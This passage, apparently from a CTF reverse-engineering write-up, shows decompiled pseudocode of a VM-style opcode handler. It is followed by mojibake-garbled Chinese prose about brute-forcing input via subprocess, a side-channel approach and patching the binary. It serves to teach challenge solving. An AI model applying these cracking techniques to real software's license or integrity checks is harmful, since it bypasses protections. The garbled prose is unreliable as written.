class="comment">// dl</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v20; <span class="comment">// bp</span></span><br><span class="line">  __int64 v21; <span class="comment">// r12</span></span><br><span class="line">  __int64 v22; <span class="comment">// r15</span></span><br><span class="line">  __int64 v23; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">char</span> v26; <span class="comment">// bp</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v27; <span class="comment">// al</span></span><br><span class="line">  __int64 v28; <span class="comment">// r15</span></span><br><span class="line">  __int64 v29; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// r14d</span></span><br><span class="line">  __int64 v31; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v32; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v33; <span class="comment">// r10</span></span><br><span class="line">  __int64 v34; <span class="comment">// rax</span></span><br><span class="line">  __int64 v35; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v36; <span class="comment">// r9</span></span><br><span class="line">  __int64 v37; <span class="comment">// rax</span></span><br><span class="line">  __int64 v38; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v39; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v40; <span class="comment">// bp</span></span><br><span class="line">  __int64 v41; <span class="comment">// rax</span></span><br><span class="line">  __int64 v42; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v43; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v44; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v45; <span class="comment">// [rsp-7Ch] [rbp-124h]</span></span><br><span class="line">  __int64 v46; <span class="comment">// [rsp-78h] [rbp-120h]</span></span><br><span class="line">  __int64 v47; <span class="comment">// [rsp-70h] [rbp-118h]</span></span><br><span class="line">  __int64 v48; <span class="comment">// [rsp-68h] [rbp-110h]</span></span><br><span class="line">  <span class="type">int</span> v49; <span class="comment">// [rsp-5Ch] [rbp-104h]</span></span><br><span class="line">  __int64 v50; <span class="comment">// [rsp-58h] [rbp-100h]</span></span><br><span class="line">  __int64 v51; <span class="comment">// [rsp-50h] [rbp-F8h]</span></span><br><span class="line">  __int64 v52; <span class="comment">// [rsp-48h] [rbp-F0h]</span></span><br><span class="line"></span><br><span class="line">  v45 = a2;</span><br><span class="line">  v4 = (<span class="type">unsigned</span> __int8)a3;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)a3 &gt; <span class="number">3u</span> )</span><br><span class="line">    sub_403550((<span class="type">unsigned</span> __int8)a3, <span class="number">4LL</span>, &amp;off_442EF0);</span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a3 &gt;&gt; <span class="number">8</span>;</span><br><span class="line">  v8 = a3 + (*((_BYTE *)&amp;v45 + v4) &gt;&gt; <span class="number">6</span>);</span><br><span class="line">  v9 = *((_BYTE *)&amp;v45 + v4) &amp; <span class="number">0x3F</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v9;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (v8 &amp; <span class="number">3</span>) + <span class="number">1041</span>) = v9;</span><br><span class="line">  v10 = BYTE1(a3);</span><br><span class="line">  <span class="keyword">if</span> ( BYTE1(a3) &gt;= <span class="number">4u</span> )</span><br><span class="line">    sub_403550(BYTE1(a3), <span class="number">4LL</span>, &amp;off_442F08);</span><br><span class="line">  v11 = HIWORD(a3);</span><br><span class="line">  v12 = HIBYTE(a3);</span><br><span class="line">  v13 = *((_BYTE *)&amp;v45 + v10);</span><br><span class="line">  v46 = v7;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (((_BYTE)v7 + (v13 &gt;&gt; <span class="number">6</span>)) &amp; <span class="number">3</span>) + <span class="number">1041</span>) = v13 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + (((<span class="type">unsigned</span> __int8)(<span class="number">65</span> * v11) &gt;&gt; <span class="number">5</span>) | <span class="number">1LL</span>) + <span class="number">1040</span>) = (<span class="number">65</span> * v11) &amp; <span class="number">0x3F</span>;</span><br><span class="line">  v14 = (<span class="number">65</span> * v12) &amp; <span class="number">0x3F</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v14;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + (((<span class="type">unsigned</span> __int8)(<span class="number">65</span> * v12) &gt;&gt; <span class="number">5</span>) | <span class="number">1LL</span>) + <span class="number">1040</span>) = v14;</span><br><span class="line">  v15 = <span class="number">8</span> * v11 + <span class="number">2</span> * v12;</span><br><span class="line">  v16 = v12 &amp; <span class="number">3</span>;</span><br><span class="line">  v17 = (v15 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v18 = (v15 &amp; <span class="number">0x20</span>) != <span class="number">0</span>;</span><br><span class="line">  v50 = v15 &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  v52 = (<span class="type">unsigned</span> __int8)v11;</span><br><span class="line">  v51 = v4;</span><br><span class="line">  <span class="keyword">switch</span> ( v15 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v17 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v17 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v17 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v17 | (<span class="number">4</span> * v18)) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v16 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v15 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v17 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v17 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v15 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v48 = v6;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, _QWORD))sub_40AA60)(OPCODES_REGS, v6, v11);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64, _QWORD))sub_40AA60)(OPCODES_REGS, v46, (<span class="type">unsigned</span> <span class="type">int</span>)v12);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)v11 &gt;= <span class="number">4u</span> )</span><br><span class="line">    sub_403550((<span class="type">unsigned</span> __int8)v11, <span class="number">4LL</span>, &amp;off_442F20);</span><br><span class="line">  v47 = ((<span class="type">unsigned</span> __int8)(<span class="number">8</span> * v11 + <span class="number">2</span> * v12) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v19 = *((_BYTE *)&amp;v45 + (<span class="type">unsigned</span> __int8)v11);</span><br><span class="line">  v49 = <span class="number">2</span> * v11;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + ((<span class="number">2</span> * (_BYTE)v11) &amp; <span class="number">6</span>) + <span class="number">1041</span>) = v19 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  v20 = *((_BYTE *)&amp;v45 + v12);</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v20 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  v21 = <span class="number">2</span> * v16;</span><br><span class="line">  v22 = <span class="number">2</span> * v16 + <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v16 + <span class="number">1041</span>) = v20 &amp; <span class="number">0x3F</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (v19 &gt;&gt; <span class="number">6</span>) | <span class="number">0x20</span>u);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (v20 &gt;&gt; <span class="number">6</span>) | <span class="number">0x24</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( v50 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0LL</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + v21 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v22 + <span class="number">1040</span>);</span><br><span class="line">      v23 = (<span class="type">unsigned</span> __int8)v47;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v47 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v47 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + v22 + <span class="number">1040</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2</span> * v23 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v47 + <span class="number">4</span> * v18) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v16 + <span class="number">1040</span>);</span><br><span class="line">LABEL_16:</span><br><span class="line">      v24 = v46;</span><br><span class="line">      v25 = v48;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">      v24 = v46;</span><br><span class="line">      v25 = v48;</span><br><span class="line">      <span class="keyword">if</span> ( (v15 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v47 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + v21 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v22 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v47 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v26 = <span class="number">2</span> * v24;</span><br><span class="line">  v27 = <span class="number">2</span> * v24 + <span class="number">8</span> * v25;</span><br><span class="line">  v28 = v24 &amp; <span class="number">3</span>;</span><br><span class="line">  v29 = (v27 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v27 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v29 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v29 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v29 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v29 | (<span class="number">4</span> * ((v27 &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v27 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v29 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v29 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v27 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v30 = v25;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v25 - <span class="number">116</span>));</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">72</span>));</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">84</span>));</span><br><span class="line">  LOBYTE(v31) = <span class="number">0x80</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v31);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">76</span>));</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, (<span class="type">unsigned</span> <span class="type">int</span>)(v30 - <span class="number">104</span>));</span><br><span class="line">  v32 = <span class="number">2</span> * v30;</span><br><span class="line">  LOBYTE(v32) = <span class="number">2</span> * v30 - <span class="number">88</span>;</span><br><span class="line">  v33 = v51 &amp; <span class="number">3</span>;</span><br><span class="line">  v34 = ((<span class="type">unsigned</span> __int8)v32 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v35 = v32;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int8)v32 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1041</span>);</span><br><span class="line">      v35 = *(<span class="type">unsigned</span> __int8 *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v34 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v34 + <span class="number">1040</span>) = v35;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v34 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v34 | (<span class="number">4</span> * ((v32 &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v33 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v32 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v34 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v33 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v34 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v32 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  LOBYTE(v35) = <span class="number">-124</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v35);</span><br><span class="line">  v36 = v52 &amp; <span class="number">3</span>;</span><br><span class="line">  v37 = ((<span class="type">unsigned</span> __int8)(v49 - <span class="number">88</span>) &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="type">unsigned</span> __int8)(v49 - <span class="number">88</span>) &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v37 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v37 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v37 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v37 | (<span class="number">4</span> * ((((_BYTE)v49 - <span class="number">88</span>) &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v36 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (((_BYTE)v49 - <span class="number">88</span>) &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v37 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v36 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v37 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = (v49 - <span class="number">88</span>) &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, <span class="number">0LL</span>);</span><br><span class="line">  LOBYTE(v38) = <span class="number">-100</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v38);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">116</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">72</span>);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">84</span>);</span><br><span class="line">  LOBYTE(v39) = <span class="number">0x80</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v39);</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24 - <span class="number">76</span>);</span><br><span class="line">  LOBYTE(v24) = v24 - <span class="number">104</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, _QWORD))sub_40A800)(OPCODES_REGS, v24);</span><br><span class="line">  v40 = v26 - <span class="number">88</span>;</span><br><span class="line">  v41 = (v40 &gt;&gt; <span class="number">3</span>) &amp; <span class="number">3</span>;</span><br><span class="line">  v42 = v40 &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v40 &gt;&gt; <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>);</span><br><span class="line">      v42 = *(<span class="type">unsigned</span> __int8 *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v41 + <span class="number">1041</span>);</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v41 + <span class="number">1040</span>) = v42;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v41 + <span class="number">1041</span>) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + (<span class="type">unsigned</span> __int8)(v41 | (<span class="number">4</span> * ((v40 &amp; <span class="number">0x20</span>) != <span class="number">0</span>))) + <span class="number">1040</span>) = *(_BYTE *)(OPCODES_REGS + v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="keyword">if</span> ( (v40 &amp; <span class="number">0x20</span>) != <span class="number">0</span> )</span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + v41 + <span class="number">1048</span>) = *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1040</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        *(_BYTE *)(OPCODES_REGS + <span class="number">2LL</span> * (<span class="type">unsigned</span> __int8)v28 + <span class="number">1041</span>) = *(_BYTE *)(OPCODES_REGS + v41 + <span class="number">1048</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      *(_BYTE *)(OPCODES_REGS + <span class="number">1051</span>) = v40 &amp; <span class="number">0x3E</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  LOBYTE(v42) = <span class="number">-124</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v42);</span><br><span class="line">  *(_BYTE *)(OPCODES_REGS + <span class="number">1049</span>) = *(_BYTE *)(OPCODES_REGS + v21 + <span class="number">1040</span>);</span><br><span class="line">  LOBYTE(v43) = <span class="number">4</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v43);</span><br><span class="line">  LOBYTE(v44) = <span class="number">-100</span>;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(__int64, __int64))sub_40A800)(OPCODES_REGS, v44);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ˆæ˜æ˜¾æ˜¯éš¾ä»¥ç›´æ¥åˆ†ææˆ–è€…æ¨¡æ‹Ÿè¿™ä¸ªè¿‡ç¨‹è¿›è¡Œçˆ†ç ´çš„ è¿™æ—¶å€™å°±ä¼šè‡ªç„¶æƒ³åˆ°ç›´æ¥å¯¹ç¨‹åºè¾“å…¥æ•°æ®è¿›è¡Œçˆ†ç ´çš„æ–¹æ³• pythonçš„<code>subprocess</code>æ¨¡å—å°±æ˜¯å®ç°è¿™ä¸ªæƒ³æ³•å’Œä¸‹é¢ä¾§ä¿¡é“æ”»å‡»çš„å…³é”® å¯¹äºè¿™é“é¢˜ ç”±äºç¼ºå°‘ä¾§ä¿¡é“çˆ†ç ´çš„å…³é”®è¦ç´ â€“ç¨‹åºå«æœ‰å¤§é‡å¯¼è‡´ç¨‹åºé€€å‡ºçš„åˆ†æ”¯ æ‰€ä»¥è¿™é‡Œè¦ä¿®æ”¹ä¸€ä¸‹ç¨‹åº</p>
<p>åŠ¨è°ƒçš„è¿‡ç¨‹å¯ä»¥å¾ˆæ˜æ˜¾çœ‹å‡ºä¸Šè¿°<code>OPCODES_REGS</code>åç§»ä¸º1040å¼€å§‹æ˜¯ä¸€ç³»åˆ—çš„å¯„å­˜å™¨ 0~1040çš„æ•°æ®ç›®æµ‹æ˜¯opcodeä¸è¿‡è¿™ä¸ªä¸é‡è¦ ç›´æ¥çœ‹åˆ°æ‰€æœ‰å¤„ç†å‡½æ•°æ‰§è¡Œå®Œåçš„æ ¡éªŒç¯èŠ‚:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F29%2F20240829-111502.png" alt="image-20240829111502100"></p>
